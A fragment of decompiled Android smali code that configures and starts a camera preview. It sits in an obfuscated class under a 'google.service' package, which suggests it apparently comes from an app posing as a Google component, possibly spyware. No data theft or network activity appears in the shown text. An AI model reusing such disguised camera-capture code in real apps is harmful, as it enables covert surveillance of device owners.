    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_1

    .line 188
    sget-object v3, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    .line 189
    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v3

    .line 190
    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/hardware/Camera$Size;

    .line 191
    iget v5, v4, Landroid/hardware/Camera$Size;->width:I

    const/16 v6, 0x258

    if-le v5, v6, :cond_0

    iget v5, v4, Landroid/hardware/Camera$Size;->height:I

    const/16 v6, 0x190

    if-le v5, v6, :cond_0

    move-object v2, v4

    goto :goto_0

    .line 196
    :cond_1
    iget-object v3, p0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->vul:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v3, v3, v4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const/4 v4, 0x1

    if-ne v3, v4, :cond_2

    .line 197
    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v3

    .line 198
    invoke-interface {v3, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 199
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    .line 202
    :cond_2
    iget v0, v2, Landroid/hardware/Camera$Size;->width:I

    iget v2, v2, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v1, v0, v2}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    .line 203
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    .line 204
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 205
    sget-object v0, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    .line 207
    sget-object p1, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;->cm:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
